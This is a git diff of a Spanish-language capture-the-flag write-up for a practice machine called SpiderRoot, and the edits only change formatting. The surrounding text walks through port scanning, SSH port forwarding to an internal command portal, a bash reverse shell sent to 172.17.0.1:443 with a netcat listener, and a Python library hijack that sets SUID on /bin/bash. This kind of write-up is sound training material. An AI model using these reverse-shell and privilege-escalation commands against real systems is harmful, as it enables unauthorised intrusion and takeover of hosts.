@@ -14,11 +14,11 @@ La máquina SpiderRoot posee la IP 172.17.0.2.
 
 ## Descubrimiento de Puertos
 
-Realizamos un reconocimiento de todos los puertos de la máquina y nos quedamos únicamente con aquellos que están abiertos. Para ello, vamos a recurrir a la herramienta `nmap`.
+Realizamos un reconocimiento de todos los puertos de la máquina y nos quedamos únicamente con aquellos que están abiertos. Para ello, vamos a recurrir a la herramienta **nmap**.
 
 ![allPorts](screenshots/allPorts.png)
 
-La máquina tiene abiertos los puertos `22` y `80`, por lo tanto, vamos a proceder a realizar un escaneo de los servicios y versiones de ellos.
+La máquina tiene abiertos los puertos 22 y 80, por lo tanto, vamos a proceder a realizar un escaneo de los servicios y versiones de ellos.
 
 ![target](screenshots/target.png)
 
@@ -85,7 +85,7 @@ Revisamos permisos SUID, sudoers, capabilities, tareas que se ejecuten periódic
 Recordando la nota del directiro de peter, probamos a mirar los puertos que están abiertos localmente.
 ![internal_port](screenshots/internal_port.png)
 
-Encontramos que de forma local hay algún servicio ejecutándose en el puerto `8080`, como disponemos de credenciales para conectarnos por ssh, vamos utilizar ssh para aplicar port forwarding y llevar ese servicio del puerto 8080 a nuestra máquina.
+Encontramos que de forma local hay algún servicio ejecutándose en el puerto **8080**, como disponemos de credenciales para conectarnos por ssh, vamos utilizar ssh para aplicar port forwarding y llevar ese servicio del puerto 8080 a nuestra máquina.
 
 ```bash
 ssh -L 8080:127.0.0.1:8080 peter@172.17.0.2
@@ -95,12 +95,12 @@ Tras introducir las credenciales de peter, el servicio del puerto 8080 que corre
 
 ![internal_8080](screenshots/internal_8080.png)
 
-Vemos un portal en el que al parecer podemos ejecutar comandos. Probamos a introducir un `whoami` y obtenemos como salida `www-data`, por lo tanto vamos a introducir una reverse shell.
+Vemos un portal en el que al parecer podemos ejecutar comandos. Probamos a introducir un **whoami** y obtenemos como salida **www-data**, por lo tanto vamos a introducir una reverse shell.
 ```bash
 bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 ```
 
-Antes de ejecutarla, nos ponemos en escucha con `netcat` en el puerto 443.
+Antes de ejecutarla, nos ponemos en escucha con **netcat** en el puerto 443.
 ```bash
 nc -nlvp 443
 ```
@@ -117,21 +117,21 @@ Ahora procedemos a realizar el tratamiento de la TTY.
 
 ### Root
 
-Ahora somos el usuario `www-data`, así que vamos a comprobar sus permisos sudoers con `sudo -l`.
+Ahora somos el usuario **www-data**, así que vamos a comprobar sus permisos sudoers con `sudo -l`.
 
-Y observamos que puede ejecutar como cualquier usuario sin proporcionar contraseña el archivo que habíamos encontrado en `/opt`.
+Y observamos que puede ejecutar como cualquier usuario sin proporcionar contraseña el archivo que habíamos encontrado en **/opt**.
 
 ```bash
 (ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
 ```
 
-Como hemos visto anteriormente, ese script utilizaba las librerías de os, sys, json y math. Además, disponemos de permisos de escritura en el directorio `/opt`. Así que solo nos queda comprobar el path de python para ver si podemos ejecutar un Python Library Hijacking.
+Como hemos visto anteriormente, ese script utilizaba las librerías de os, sys, json y math. Además, disponemos de permisos de escritura en el directorio **/opt**. Así que solo nos queda comprobar el path de python para ver si podemos ejecutar un Python Library Hijacking.
 
 ![path_python](screenshots/path_python.png)
 
 Vemos que la primera ruta en la que python busca las librerías es el mismo directorio en el que se situa el archivo, por lo tanto, podemos ejecutar un Python Library Hijacking. 
 
-Para ello, vamos a crear en el directirio `/opt` un archivo llamado `json.py` con el siguiente código en su interior, para darle a la bash permisos SUID.
+Para ello, vamos a crear en el directirio **/opt** un archivo llamado **json.py** con el siguiente código en su interior, para darle a la bash permisos SUID.
 
 ```python
 import os; os.system("chmod u+s /bin/bash")
